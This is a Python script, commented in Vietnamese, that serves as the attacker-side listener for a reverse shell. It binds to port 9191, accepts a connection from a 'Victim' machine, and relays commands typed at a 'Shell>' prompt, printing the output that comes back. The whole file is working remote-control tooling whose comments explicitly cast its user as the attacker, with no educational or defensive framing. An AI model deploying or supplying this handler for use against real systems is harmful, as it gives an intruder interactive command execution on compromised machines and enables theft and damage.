import socket
import sys

# Cấu hình lắng nghe
LISTEN_HOST = '0.0.0.0' # Lắng nghe trên tất cả các giao diện
LISTEN_PORT = 9191      # Phải khớp với cổng trong reverse shell


def listener_server():
    # 1. Tạo socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Cho phép sử dụng lại địa chỉ/cổng ngay lập tức (tránh lỗi "Address already in use")
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 2. Gán và lắng nghe
    server_socket.bind((LISTEN_HOST, LISTEN_PORT))
    server_socket.listen(1)
    print(f"[*] Server đang lắng nghe trên cổng {LISTEN_PORT}...")

    # 3. Chờ và chấp nhận kết nối
    conn, addr = server_socket.accept()
    print(f"[*] Reverse Shell đã kết nối từ: {addr[0]}:{addr[1]}")

    try:
        # Vòng lặp giao tiếp chính
        while True:
            # Nhận lệnh từ người dùng Attacker
            command = input("Shell> ")
            # sys.stdout.flush()

            if command.lower() == 'exit':
                conn.send(b'exit\n') # Gửi lệnh exit đến shell (tùy thuộc shell)
                break

            if not command:
                continue

            # Gửi lệnh và thêm ký tự xuống dòng (cần cho shell)
            conn.send(command.encode('utf-8') + b'\n')
            # Nhận và in phản hồi từ Victim
            response = conn.recv(1024).decode('utf-8', errors='ignore')
            print(response)

    except Exception as e:
        print(f"\n[-] Mất kết nối hoặc lỗi xảy ra: {e}")
    finally:
        # Đóng kết nối
        conn.close()
        server_socket.close()
        print("[*] Server đã đóng.")

if __name__ == '__main__':
    listener_server()
